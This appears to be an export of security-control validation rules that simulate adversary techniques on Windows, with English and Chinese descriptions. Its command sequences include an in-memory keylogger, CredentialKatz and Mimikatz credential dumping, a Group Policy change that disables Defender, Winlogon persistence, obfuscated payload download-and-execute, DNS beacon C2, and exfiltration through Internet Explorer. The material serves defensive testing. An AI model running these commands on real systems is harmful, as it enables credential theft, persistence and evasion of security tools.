exact_source_fields.desc: This validation rule simulates a installation of the keyboard recorder by adversary on the local computer. Intruders use a technique to load keyboard recorder keys without touching the hard drive (except for writing output). In addition, encoding is used to obfuscate PowerShell commands. Although the advantage of this technology is that it is difficult to detect locally, it also brings limitations. For sample, the ps1 file must be transmitted over the Internet to give defenders the opportunity to identify scripts on the network. In addition, due to the keyboard recorder running in memory, its functionality will terminate when the PowerShell session is closed. Please note that the keyboard recorder installed in this validation rule will be removed during the cleaning process.

host_cli_action.raw_text:
iex (new-object net.webclient).downloadstring('C:\users\public\documents\gksobf.ps1')
  auto,4,true,60
  success_zero
 
Get-Keystrokes -Timeout 10 -LogPath C:\users\public\documents\key.log
 auto,15,true,60
 success_zero
  
cat C:\users\public\documents\key.log
  auto,4,true,60
  success_match:"TypedKey"
  
erase C:\users\public\documents\gksobf.ps1
  auto,4,true,3
  cleanup

erase C:\users\public\documents\key.log
  auto,4,true,3
  cleanup

exact_source_fields.desc: This validation rule simulates adversary to dump the Credential Manager in the Google Chrome browser memory using the CredentialKatz tool. CredentialKatz allows adversary to extract all credentials from the Credential Manager in Chrome and Edge. Most of the time, Chromium-based browsers store passwords encrypted in the credential manager until they are needed, such as when viewed in the credential manager or automatically filled into a login form. But for some reason, passwords_with_matching_reused_credentials of the PasswordReuseDetectorImpl class is filled with all the plaintext credentials from the credential manager. This will include all the credentials you have added in the local password manager. If you are logged into the browser with your own account, this will also include all the passwords you have synced with that account. Dependencies: Validator must have Google Chrome installed.

host_cli_action.raw_text:
whoami
C:\Users\Public\Documents\{{v_action_id}}\check_chrome.bat
start /b "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --disable-gpu --no-sandbox >nul 2>&1
C:\Users\Public\Documents\{{v_action_id}}\CredentialKatz.exe > C:\Users\Public\Documents\{{v_action_id}}\CredentialKatz.txt
powershell.exe -c "Get-Content -Path 'C:\Users\Public\Documents\{{v_action_id}}\CredentialKatz.txt'"
taskkill.exe /F /IM chrome.exe
rd /s /q C:\Users\Public\Documents\{{v_action_id}}

exact_source_fields.desc: This validation rule simulates adversary to dump the Credential Manager in the Microsoft Edge browser memory using the CredentialKatz tool. CredentialKatz allows adversary to extract all credentials from the Credential Manager in Chrome and Edge. Most of the time, Chromium-based browsers store passwords encrypted in the Credential Manager until they are needed, such as when viewed in the Credential Manager or automatically filled into a login form. But for some reason, the passwords_with_matching_reused_credentials of the PasswordReuseDetectorImpl class is filled with all the plaintext credentials from the Credential Manager. This will include all the credentials you have added to your local password manager. If you are logged into the browser with your own account, this will also include all the passwords you have synced with that account. Dependency: Validator must have Microsoft Edge installed.

host_cli_action.raw_text:
whoami
C:\Users\Public\Documents\{{v_action_id}}\check_edge.bat
start /b "" "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" >nul 2>&1
start /b C:\Users\Public\Documents\{{v_action_id}}\CredentialKatz.exe /edge > C:\Users\Public\Documents\{{v_action_id}}\CredentialKatz.txt
powershell.exe -c "Get-Content -Path 'C:\Users\Public\Documents\{{v_action_id}}\CredentialKatz.txt'"
taskkill.exe /F /IM msedge.exe
rd /s /q C:\Users\Public\Documents\{{v_action_id}}

exact_source_fields.desc: This validation rule simulates adversary to dump the Credential Manager in the Microsoft Edge browser memory using the CredentialKatz tool. CredentialKatz allows adversary to extract all credentials from the Credential Manager in Chrome and Edge. Most of the time, Chromium-based browsers store passwords encrypted in the Credential Manager until they are needed, such as when viewed in the Credential Manager or automatically filled into a login form. But for some reason, the passwords_with_matching_reused_credentials of the PasswordReuseDetectorImpl class is filled with all the plaintext credentials from the Credential Manager. This will include all the credentials you have added to your local password manager. If you are logged into the browser with your own account, this will also include all the passwords you have synced with that account. Dependency: Validator must have Microsoft Edge installed.

host_cli_action.raw_text:
whoami
C:\Users\Public\Documents\{{v_action_id}}\check_edge.bat
start /b "" "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" >nul 2>&1
start /b C:\Users\Public\Documents\{{v_action_id}}\CredentialKatz.exe /edge > C:\Users\Public\Documents\{{v_action_id}}\CredentialKatz.txt
powershell.exe -c "Get-Content -Path 'C:\Users\Public\Documents\{{v_action_id}}\CredentialKatz.txt'"
taskkill.exe /F /IM msedge.exe
rd /s /q C:\Users\Public\Documents\{{v_action_id}}

exact_source_fields.desc:
This validation rule simulates an adversary attempt to create a new Group Policy object to disable Windows Defender. Group Policy Object (GPO) is a set of settings that can be applied to AD containers (such as domains and organizational units, OUs). These settings range from scheduling tasks to disabling or enabling software for users. Adversary may attempt to modify or create new GPOs to establish persistence, evade defense, or elevate privileges in a compromised environment. This validation rule requires domain bound hosts to execute successfully. This validation rule also requires the installation of Remote Server Management Tool (RSAT): Group Policy Management Tool and RSAT: AD Domain Services and Lightweight Directory Services Tool on the host.

** Warning: * * This validation rule will modify the group policy to disable security tools. Although there are cleaning steps to undo the changes created by this validation rule, it is not recommended to run this validation rule on a member of the production or sensitive domain or on a host that has access to the production or sensitive domain.

** Dependency condition: * * The validator must join a domain to properly configure the AD environment.

host_cli_action.raw_text:
Get-GPO -all
  auto,4,true,60
  success_zero

$dn = Get-ADDomain | findstr /B /C:"DistinguishedName"
  auto,4,true,60
  success_zero

$domain = $dn -split ": "
  auto,4,true,60
  success_zero

New-GPO -Name VerodinTestGPO -Comment "This is a test GPO." 
  auto,4,true,60
  blocked_match:E_ACCESSDENIED
  
reg query "HKLM\Software\Policies\Microsoft\Windows Defender"
  auto,4,true,60
  success_match:HKEY_LOCAL_MACHINE
  error_match:DisableAntiSpyware

Set-GPRegistryValue -Name "VerodinTestGPO" -key "HKLM\Software\Policies\Microsoft\Windows Defender" -ValueName "DisableAntiSpyware" -Type DWORD -Value 00000001
  auto,4,true,60
  success_zero
  
New-GPLink -Name "VerodinTestGPO" -Target $domain[1]
  auto,4,true,60
  success_zero
  
gpupdate /force
  auto,4,true,60
  success_match:success
  
reg query "HKLM\Software\Policies\Microsoft\Windows Defender"
  auto,4,true,60
  success_match:HKEY_LOCAL_MACHINE
  
Get-GPO -all
  auto,4,true,60
  success_match:VerodinTestGPO

Remove-GPO -Name "VerodinTestGPO"
  auto,4,true,60
  cleanup

reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f
  auto,4,true,60
  cleanup
  
gpupdate /force
  auto,4,true,60
  cleanup

在此验证动作中，注册表中放置了一个名为“malicious.bat”的bat文件。 当用户使用这些注册表设置登录时，将执行 bat 文件。 Malicious.bat 只是在 C:\Users\Public\Documents 中创建了一个名为 proof.txt 的文本文档，但更多的恶意文件可用于创建后门。

exact_source_fields.desc: This validation rule simulates a malicious Adversary that changed the Winlogin registry key to establish persistence. Winlogon.exe runs operations during login/logout and can be manipulated to run malicious executable files, DLLs, or scripts by placing it in the registry. In this validation rule, a .BAT file named "malicious. bat" is placed in the registry. When users log in using these registry settings, the .BAT file will be executed. Malicious.bat only created a text document called proof.txt in C:\Users\Public\Documents, but more malicious files can be used to create backdoors.

host_cli_action.raw_text:
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, C:\Users\Public\Documents\malicious.bat,"
  auto,4,true,60
  success_match:success

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr Userinit
  auto,4,true,60
  success_match:malicious

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Userinit /t REG_SZ /d C:\Windows\system32\userinit.exe,
  auto,4,true,60
  cleanup

del C:\Users\Public\Documents\malicious.bat
  auto,4,true,60
  cleanup

steps.command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, C:\Users\Public\Documents\malicious.bat,"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Userinit /t REG_SZ /d C:\Windows\system32\userinit.exe,

exact_source_fields.desc:
This validation rule simulates an adversary attempt to create a new Group Policy object to disable Windows Defender. Group Policy Object (GPO) is a set of settings that can be applied to AD containers (such as domains and organizational units, OUs). These settings range from scheduling tasks to disabling or enabling software for users. Adversary may attempt to modify or create new GPOs to establish persistence, evade defense, or elevate privileges in a compromised environment. This validation rule requires domain bound hosts to execute successfully. This validation rule also requires the installation of Remote Server Management Tool (RSAT): Group Policy Management Tool and RSAT: AD Domain Services and Lightweight Directory Services Tool on the host.

** Warning: * * This validation rule will modify the group policy to disable security tools. Although there are cleaning steps to undo the changes created by this validation rule, it is not recommended to run this validation rule on a member of the production or sensitive domain or on a host that has access to the production or sensitive domain.

** Dependency condition: * * The validator must join a domain to properly configure the AD environment.

host_cli_action.raw_text:
Get-GPO -all
  auto,4,true,60
  success_zero

$dn = Get-ADDomain | findstr /B /C:"DistinguishedName"
  auto,4,true,60
  success_zero

$domain = $dn -split ": "
  auto,4,true,60
  success_zero

New-GPO -Name VerodinTestGPO -Comment "This is a test GPO." 
  auto,4,true,60
  blocked_match:E_ACCESSDENIED
  
reg query "HKLM\Software\Policies\Microsoft\Windows Defender"
  auto,4,true,60
  success_match:HKEY_LOCAL_MACHINE
  error_match:DisableAntiSpyware

Set-GPRegistryValue -Name "VerodinTestGPO" -key "HKLM\Software\Policies\Microsoft\Windows Defender" -ValueName "DisableAntiSpyware" -Type DWORD -Value 00000001
  auto,4,true,60
  success_zero
  
New-GPLink -Name "VerodinTestGPO" -Target $domain[1]
  auto,4,true,60
  success_zero
  
gpupdate /force
  auto,4,true,60
  success_match:success
  
reg query "HKLM\Software\Policies\Microsoft\Windows Defender"
  auto,4,true,60
  success_match:HKEY_LOCAL_MACHINE
  
Get-GPO -all
  auto,4,true,60
  success_match:VerodinTestGPO

Remove-GPO -Name "VerodinTestGPO"
  auto,4,true,60
  cleanup

reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f
  auto,4,true,60
  cleanup
  
gpupdate /force
  auto,4,true,60
  cleanup

steps.command: New-GPO -Name VerodinTestGPO -Comment "This is a test GPO."

exact_source_fields.desc:
This validation rule simulates an adversary attempt to create a new Group Policy object to disable Windows Defender. Group Policy Object (GPO) is a set of settings that can be applied to AD containers (such as domains and organizational units, OUs). These settings range from scheduling tasks to disabling or enabling software for users. Adversary may attempt to modify or create new GPOs to establish persistence, evade defense, or elevate privileges in a compromised environment. This validation rule requires domain bound hosts to execute successfully. This validation rule also requires the installation of Remote Server Management Tool (RSAT): Group Policy Management Tool and RSAT: AD Domain Services and Lightweight Directory Services Tool on the host.

** Warning: * * This validation rule will modify the group policy to disable security tools. Although there are cleaning steps to undo the changes created by this validation rule, it is not recommended to run this validation rule on a member of the production or sensitive domain or on a host that has access to the production or sensitive domain.

** Dependency condition: * * The validator must join a domain to properly configure the AD environment.

host_cli_action.raw_text:
Get-GPO -all
  auto,4,true,60
  success_zero

$dn = Get-ADDomain | findstr /B /C:"DistinguishedName"
  auto,4,true,60
  success_zero

$domain = $dn -split ": "
  auto,4,true,60
  success_zero

New-GPO -Name VerodinTestGPO -Comment "This is a test GPO." 
  auto,4,true,60
  blocked_match:E_ACCESSDENIED
  
reg query "HKLM\Software\Policies\Microsoft\Windows Defender"
  auto,4,true,60
  success_match:HKEY_LOCAL_MACHINE
  error_match:DisableAntiSpyware

Set-GPRegistryValue -Name "VerodinTestGPO" -key "HKLM\Software\Policies\Microsoft\Windows Defender" -ValueName "DisableAntiSpyware" -Type DWORD -Value 00000001
  auto,4,true,60
  success_zero
  
New-GPLink -Name "VerodinTestGPO" -Target $domain[1]
  auto,4,true,60
  success_zero
  
gpupdate /force
  auto,4,true,60
  success_match:success
  
reg query "HKLM\Software\Policies\Microsoft\Windows Defender"
  auto,4,true,60
  success_match:HKEY_LOCAL_MACHINE
  
Get-GPO -all
  auto,4,true,60
  success_match:VerodinTestGPO

Remove-GPO -Name "VerodinTestGPO"
  auto,4,true,60
  cleanup

reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f
  auto,4,true,60
  cleanup
  
gpupdate /force
  auto,4,true,60
  cleanup

steps.command: New-GPO -Name VerodinTestGPO -Comment "This is a test GPO."

exact_source_fields.desc: This validation rule simulates a malicious Adversary that changed the Winlogin registry key to establish persistence. Winlogon.exe runs operations during login/logout and can be manipulated to run malicious executable files, DLLs, or scripts by placing it in the registry. In this validation rule, a .BAT file named "malicious. bat" is placed in the registry. When users log in using these registry settings, the .BAT file will be executed. Malicious.bat only created a text document called proof.txt in C:\Users\Public\Documents, but more malicious files can be used to create backdoors.

host_cli_action.raw_text:
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, C:\Users\Public\Documents\malicious.bat,"
  auto,4,true,60
  success_match:success

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr Userinit
  auto,4,true,60
  success_match:malicious

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Userinit /t REG_SZ /d C:\Windows\system32\userinit.exe,
  auto,4,true,60
  cleanup

del C:\Users\Public\Documents\malicious.bat
  auto,4,true,60
  cleanup

steps.command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, C:\Users\Public\Documents\malicious.bat,"

exact_source_fields.action_description: 此验证动作还原了攻击者如何使用 Invoke-Mimikatz PowerShell 脚本提取密码。在此验证动作中，"lsadump::sam"模块用于从安全帐户管理器 (SAM) 数据库获取 NTLM 哈希。此信息可用于登录其他帐户或用于 NTLM 哈希传递攻击。MIMIKATZ 是由安全研究员 Benjamin Delpy 开发的 Windows 安全审计工具。MIMIKATZ 可用于窃取密码哈希值并Dump从内存中提取的明文密码。MIMIKATZ 可以Dump来自 LSASS 的凭据以及 Kerberos 密码。Linux 和 Unix 系统将 Kerberos 凭证Dump在缓存文件中，MIMIKATZ 也可以提取该文件。 请注意，此 验证动作中使用的 Invoke-Mimikatz 脚本使用旧版本的 Mimikatz，可能无法在较新的系统(某些版本的 Windows 10 及更高版本)上正常运行。

exact_source_fields.desc: This validation rule simulates how Adversary uses Invoke-Mimikatz PowerShell scripts to extract passwords. In this validation rule, the "lsadump:: sam" module is used to obtain the NTLM hash from the Security Account Manager (SAM) database. This information can be used to log in to other accounts or for NTLM hash passing attacks. MIMIKATZ is a Windows security audit tool developed by security researcher Benjamin Delpy. MIMIKATZ can be used to steal password hash values and dump plaintext passwords extracted from memory. MIMIKATZ can dump credentials from LSASS as well as KerberOS passwords. Linux and Unix systems dump the HTTPS credentials in a cache file, which MIMIKATZ can also extract. Please note that the Invoke-Mimikatz script used in this validation rule uses an older version of Mimikatz and may not run properly on newer systems (some versions of Windows 10 and higher).

host_cli_action.raw_text:
#Import mimikatz module
import-module 'C:\Users\Public\Documents\Invoke-Mimikatz.ps1'
  auto,15,true,60
  blocked_match:ScriptContainedMaliciousContent

#Test privilege access with mimikatz
Invoke-Mimikatz -Command '"privilege::debug"'
  auto,20,true,60
  success_match:ok
 
Invoke-Mimikatz -Command '"token::elevate"'
 	auto,20,true,60
  success_match:AUTHORITY

#Get password hashes from SAM for offline cracking
Invoke-Mimikatz -Command '"lsadump::sam"'
  auto,20,true,60
  success_match:Hash
  

#Cleanup
rm C:\Users\Public\Documents\Invoke-Mimikatz.ps1
   auto,4,true,60
   cleanup

cd C:\Users\Public\Documents
  auto,4,true,60
  success_zero
 
$lib_data = [System.IO.File]::ReadAllBytes("C:\Users\Public\Documents\DataOb.dll")
  auto,4,true,60
  success_zero

[Reflection.Assembly]::Load($lib_data)
  auto,4,true,60
  success_zero
  
$image_file = (New-Object System.Net.WebClient).DownloadData("http://127.0.0.1:3344/evil_kitty_2.jpg")

  success_zero

$deob_data = [DataOb.DataOb]::DeobfuscateViaAppend($image_file)
  auto,4,true,60
  success_zero
  
Invoke-Expression ([System.Text.Encoding]::ASCII.GetString($deob_data))
  auto,4,true,60
  success_zero
  
Invoke-Mimikatz
  auto,4,true,60
  success_match:mimikatz 2.2.0

rm C:\Users\Public\Documents\DataOb.dll

此验证动作还原了攻击者如何使用 Invoke-Mimikatz PowerShell 脚本提取密码。在此验证动作中，"lsadump::sam"模块用于从安全帐户管理器 (SAM) 数据库获取 NTLM 哈希。此信息可用于登录其他帐户或用于 NTLM 哈希传递攻击。MIMIKATZ 是由安全研究员 Benjamin Delpy 开发的 Windows 安全审计工具。MIMIKATZ 可用于窃取密码哈希值并Dump从内存中提取的明文密码。MIMIKATZ 可以Dump来自 LSASS 的凭据以及 Kerberos 密码。Linux 和 Unix 系统将 Kerberos 凭证Dump在缓存文件中，MIMIKATZ 也可以提取该文件。请注意，此 验证动作中使用的 Invoke-Mimikatz 脚本使用旧版本的 Mimikatz，可能无法在较新的系统(某些版本的 Windows 10 及更高版本)上正常运行。

exact_source_fields.desc: This validation rule simulates how adversary uses Invoke Mimikatz PowerShell scripts to extract passwords. In This validation rule, the "lsadump:: sam" module is used to obtain the NTLM hash from the Security Account Manager (SAM) database. This information can be used to log in to other accounts or for NTLM hash passing attacks. MIMIKATZ is a Windows security audit tool developed by security researcher Benjamin Delpy. MIMIKATZ can be used to steal password hash values and dump plaintext passwords extracted from memory. MIMIKATZ can dump credentials from LSASS as well as KerberOS passwords. Linux and Unix systems dump the HTTPS credentials in a cache file, which MIMIKATZ can also extract. Please note that the Invoke Mimikatz script used in This validation rule uses an older version of Mimikatz and may not run properly on newer systems (some versions of Windows 10 and higher).

host_cli_action.raw_text:
#Import mimikatz module
iex((new-object net.webclient).downloadstring('C:\Users\Public\Documents\Invoke-Mimikatz.ps1'))
  auto,15,true,60
  blocked_match:ScriptContainedMaliciousContent

#Test privilege access with mimikatz
Invoke-Mimikatz -Command '"privilege::debug"'
  auto,20,true,60
  success_match:ok
 
Invoke-Mimikatz -Command '"token::elevate"'
 	auto,20,true,60
  success_match:AUTHORITY

#Get password hashes from SAM for offline cracking
Invoke-Mimikatz -Command '"lsadump::sam"'
  auto,20,true,60
  success_match:Hash
  

#Cleanup
rm C:\Users\Public\Documents\Invoke-Mimikatz.ps1
   auto,4,true,60
   cleanup

exact_source_fields.desc: This validation rule simulates the host's attempt to download a variant of MIMIKATZ PowerShell and execute the sample from memory. this sample confuses the file by adding a JPEG header before the script, resulting in the file being disguised as an image file. MIMIKATZ is a Windows security audit tool. MIMIKATZ can be used to steal password hashes and dump plaintext passwords extracted from memory. MIMIKATZ can obtain LSASS Dump credentials as well as HTTPS passwords. Linux and Unix systems store HTTPS credentials in cache files, which MIMIKATZ can also extract.

host_cli_action.raw_text:
cd C:\Users\Public\Documents
  auto,4,true,60
  success_zero
  
$lib_data = [System.IO.File]::ReadAllBytes("C:\Users\Public\Documents\DataOb.dll")
  auto,4,true,60
  success_zero

[Reflection.Assembly]::Load($lib_data)
  auto,4,true,60
  success_zero
 
$image_file = (New-Object System.Net.WebClient).DownloadData("http://127.0.0.1:3344/evil_kitty_1.jpg")
  auto,10,true,60
  success_zero
  
$deob_data = [DataOb.DataOb]::DeobfuscateViaHeader($image_file)
  auto,4,true,60
  success_zero
  
Invoke-Expression ([System.Text.Encoding]::ASCII.GetString($deob_data))
  auto,4,true,60
  success_zero
  
Invoke-Mimikatz
  auto,4,true,60
  success_match:mimikatz 2.2.0
  
rm C:\Users\Public\Documents\DataOb.dll
  auto,4,true,60
  cleanup

rm C:\Users\Public\Documents\vserver_files_invoke-mimikatz_jan2022-jpg_header.zip
  auto,4,true,60
  cleanup

telemetry_equivalence_constraints.exact_source_value: 此验证动作还原了攻击者如何使用 Invoke-Mimikatz PowerShell 脚本提取密码。在此验证动作中，"lsadump::sam"模块用于从安全帐户管理器 (SAM) 数据库获取 NTLM 哈希。此信息可用于登录其他帐户或用于 NTLM 哈希传递攻击。MIMIKATZ 是由安全研究员 Benjamin Delpy 开发的 Windows 安全审计工具。MIMIKATZ 可用于窃取密码哈希值并Dump从内存中提取的明文密码。MIMIKATZ 可以Dump来自 LSASS 的凭据以及 Kerberos 密码。Linux 和 Unix 系统将 Kerberos 凭证Dump在缓存文件中，MIMIKATZ 也可以提取该文件。 请注意，此 验证动作中使用的 Invoke-Mimikatz 脚本使用旧版本的 Mimikatz，可能无法在较新的系统(某些版本的 Windows 10 及更高版本)上正常运行。

exact_source_fields.desc: This validation rule simulates how Adversary uses Invoke-Mimikatz PowerShell scripts to extract passwords. In this validation rule, the "lsadump:: sam" module is used to obtain the NTLM hash from the Security Account Manager (SAM) database. This information can be used to log in to other accounts or for NTLM hash passing attacks. MIMIKATZ is a Windows security audit tool developed by security researcher Benjamin Delpy. MIMIKATZ can be used to steal password hash values and dump plaintext passwords extracted from memory. MIMIKATZ can dump credentials from LSASS as well as KerberOS passwords. Linux and Unix systems dump the HTTPS credentials in a cache file, which MIMIKATZ can also extract. Please note that the Invoke-Mimikatz script used in this validation rule uses an older version of Mimikatz and may not run properly on newer systems (some versions of Windows 10 and higher).

host_cli_action.raw_text:
#Import mimikatz module
import-module 'C:\Users\Public\Documents\Invoke-Mimikatz.ps1'
  auto,15,true,60
  blocked_match:ScriptContainedMaliciousContent

#Test privilege access with mimikatz
Invoke-Mimikatz -Command '"privilege::debug"'
  auto,20,true,60
  success_match:ok
 
Invoke-Mimikatz -Command '"token::elevate"'
 	auto,20,true,60
  success_match:AUTHORITY

#Get password hashes from SAM for offline cracking
Invoke-Mimikatz -Command '"lsadump::sam"'
  auto,20,true,60
  success_match:Hash
  

#Cleanup
rm C:\Users\Public\Documents\Invoke-Mimikatz.ps1
   auto,4,true,60
   cleanup

exact_source_fields.action_description: 此验证动作还原了攻击者使用 Kerbrute 针对 Windows 域环境进行密码喷洒攻击。密码喷洒是一种针对 Windows 域环境中广泛使用的密码破解技术，攻击者主要基于 Kerberos 协议中 AS-REP 返回数据包中的属性值来判断是否枚举成功，攻击者使用常见的弱密码（如 123456、password、Welcome1 等）针对大量不同的域用户进行尝试，而不是像传统暴力破解那样对单个用户进行密码猜测，其目的是在不触发账户锁定策略的情况下获取域内账户的有效登录凭据。

exact_source_fields.desc: This validation rule simulates adversary to use Kerbrute to perform password spray attacks on Windows domain environments. Password spraying is a widely used password cracking technology in Windows domain environments. adversary mainly determines whether the enumeration is successful based on the attribute value in the AS-REP return data packet in the Kerberos protocol. adversary uses common weak passwords (such as 123456, password, Welcome1, etc.) to try a large number of different domain users, rather than guessing the password of a single user like traditional brute force cracking. Its purpose is to obtain valid login credentials for domain accounts without triggering the account lockout policy.

exact_source_fields.desc: This validation rule simulates the use of DNS beacon methods by beacon backdoors to communicate with their command and control infrastructure. In this validation rule, infected machines infected with beacon variants will contact the controller to obtain more commands to run on the machine through DNS. The communication and commands issued are encoded in DNS Query to hide any significant behavior of the monitoring tool. Beacon is a backdoor written in C/C++and is part of the Cobalt Strike framework. The supported backdoor commands include shell command execution, file transfer, file execution, and file management. Beacons can also be used for keylogging and screenshots, as well as acting as proxy servers. Beacons may also be responsible for collecting system credentials, port scanning, and enumerating systems on the network. Beacons communicate with C2 servers through HTTP or DNS. Note: To mitigate any risks faced by users, we provide an option to input a domain as the target for simulating DNS beacon communication.

host_cli_action.raw_text:
cd C:\Users\Public\Documents\
  auto,4,true,60
  success_zero
  
& .\DNSA_Beacon.bat {{v_target_domain}}
  auto,180,true,240
  success_zero
  
Get-DnsClientCache | Select Entry,Status
  auto,180,true,240
  success_zero
  
## REQUIRED_CLEANUP_MARKER ##
rm C:\Users\Public\Documents\DNSA_Beacon.bat
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates a use of DNS beacon methods by beacon backdoors to communicate with their command and control infrastructure. In this validation rule, infected machines infected with beacon variants will contact the controller to obtain more commands to run on the machine through DNS. The communication and commands issued are encoded in DNS requests to hide any significant behavior of the monitoring tool. Beacon is a backdoor written in C/C++ and is part of the Cobalt Strike framework. The supported backdoor commands include shell command execution, file transfer, file execution, and file management. Beacons can also be used for keylogging and screenshots, as well as acting as proxy servers. Beacons may also be responsible for collecting system credentials, port scanning, and enumerating systems on the network. Beacons communicate with C2 servers through HTTP or DNS. Note: To mitigate any risks faced by users, we provide an option to input a domain as the target for simulating DNS beacon communication.

host_cli_action.raw_text:
cd C:\Users\Public\Documents\
  auto,4,true,60
  success_zero
  
& .\DNSTXT_Beacon.bat {{v_target_domain}}
  auto,60,true,120
  success_zero
  
Get-DnsClientCache | Select Entry,Status
  auto,60,true,120
  success_zero
  
## REQUIRED_CLEANUP_MARKER ##
rm C:\Users\Public\Documents\DNSTXT_Beacon.bat
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the use of DNS beacon methods by beacon backdoors to communicate with their command and control infrastructure. In this validation rule, infected machines infected with beacon variants will contact the controller to obtain more commands to run on the machine through DNS. The communication and commands issued are encoded in DNS Query to hide any significant behavior of the monitoring tool. Beacon is a backdoor written in C/C++and is part of the Cobalt Strike framework. The supported backdoor commands include shell command execution, file transfer, file execution, and file management. Beacons can also be used for keylogging and screenshots, as well as acting as proxy servers. Beacons may also be responsible for collecting system credentials, port scanning, and enumerating systems on the network. Beacons communicate with C2 servers through HTTP or DNS. Note: To mitigate any risks faced by users, we provide an option to input a domain as the target for simulating DNS beacon communication.

host_cli_action.raw_text:
cd C:\Users\Public\Documents\
  auto,4,true,60
  success_zero
  
& .\DNSA_Beacon.bat {{v_target_domain}}
  auto,180,true,240
  success_zero
  
Get-DnsClientCache | Select Entry,Status
  auto,180,true,240
  success_zero
  
## REQUIRED_CLEANUP_MARKER ##
rm C:\Users\Public\Documents\DNSA_Beacon.bat
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates a use of DNS beacon methods by beacon backdoors to communicate with their command and control infrastructure. In this validation rule, infected machines infected with beacon variants will contact the controller to obtain more commands to run on the machine through DNS. The communication and commands issued are encoded in DNS requests to hide any significant behavior of the monitoring tool. Beacon is a backdoor written in C/C++ and is part of the Cobalt Strike framework. The supported backdoor commands include shell command execution, file transfer, file execution, and file management. Beacons can also be used for keylogging and screenshots, as well as acting as proxy servers. Beacons may also be responsible for collecting system credentials, port scanning, and enumerating systems on the network. Beacons communicate with C2 servers through HTTP or DNS. Note: To mitigate any risks faced by users, we provide an option to input a domain as the target for simulating DNS beacon communication.

host_cli_action.raw_text:
cd C:\Users\Public\Documents\
  auto,4,true,60
  success_zero
  
& .\DNSTXT_Beacon.bat {{v_target_domain}}
  auto,60,true,120
  success_zero
  
Get-DnsClientCache | Select Entry,Status
  auto,60,true,120
  success_zero
  
## REQUIRED_CLEANUP_MARKER ##
rm C:\Users\Public\Documents\DNSTXT_Beacon.bat
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the use of DNS beacon methods by beacon backdoors to communicate with their command and control infrastructure. In this validation rule, infected machines infected with beacon variants will contact the controller to obtain more commands to run on the machine through DNS. The communication and commands issued are encoded in DNS Query to hide any significant behavior of the monitoring tool. Beacon is a backdoor written in C/C++and is part of the Cobalt Strike framework. The supported backdoor commands include shell command execution, file transfer, file execution, and file management. Beacons can also be used for keylogging and screenshots, as well as acting as proxy servers. Beacons may also be responsible for collecting system credentials, port scanning, and enumerating systems on the network. Beacons communicate with C2 servers through HTTP or DNS. Note: To mitigate any risks faced by users, we provide an option to input a domain as the target for simulating DNS beacon communication.

host_cli_action.raw_text:
cd C:\Users\Public\Documents\
  auto,4,true,60
  success_zero
  
& .\DNSA_Beacon.bat {{v_target_domain}}
  auto,180,true,240
  success_zero
  
Get-DnsClientCache | Select Entry,Status
  auto,180,true,240
  success_zero
  
## REQUIRED_CLEANUP_MARKER ##
rm C:\Users\Public\Documents\DNSA_Beacon.bat
  auto,4,true,60
  cleanup

此验证动作还原了通过 iexplore.exe (Internet Explorer) 泄露数据。"CoCreateInstance" API 函数用于创建 Internet Explorer 的 COM 实例。然后使用"Navigate()"方法向服务器发送数据。已经观察到 URSNIF 的一个变种使用这种技术将收集到的数据发送回其 C&C 服务器。
URSNIF 是一种经过修改的模块化银行恶意软件，具有后门功能。其功能包括拦截和修改浏览器流量、文件下载和上传、建立 SOCKS 代理、系统重启和关闭、系统信息收集和域生成算法 (DGA)。该恶意软件还能够从流行的电子邮件和 FTP 客户端以及浏览器中窃取数据和凭据。还

exact_source_fields.desc: This validation rule simulates data exfiltrated through iexplore.exe (Internet Explorer). The "CoCreatInstance" API function is used to create a COM instance of Internet Explorer. Then use the "Navigate()" method to send data to the server. A variant of URSNIF has been observed using this technique to send collected data back to its C2 server. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers.

host_cli_action.raw_text:
$obj = New-Object -ComObject InternetExplorer.Application
  auto,4,true
  success_zero

$obj.Navigate("http://127.0.0.1:3344")
  auto,4,true
  success_zero
  
get-process -Name iexplore | Stop-Process
  auto,4,true
	cleanup

get-process -Name ielowutil | Stop-Process
  auto,4,true
	cleanup

del C:\Windows\temp\vserver_files_dummy.zip
	auto,4,true,60
  cleanup

exact_source_fields.name: Host Command Line - URSNIF, using iexplore.exe to transfer collected data
exact_source_fields.notes: Digidations recommends running this rule as a non-administrator, system, or administrator user on Windows Server 2019, Windows 11, Windows 7, Windows Server 2016, and Windows 10 Validator.

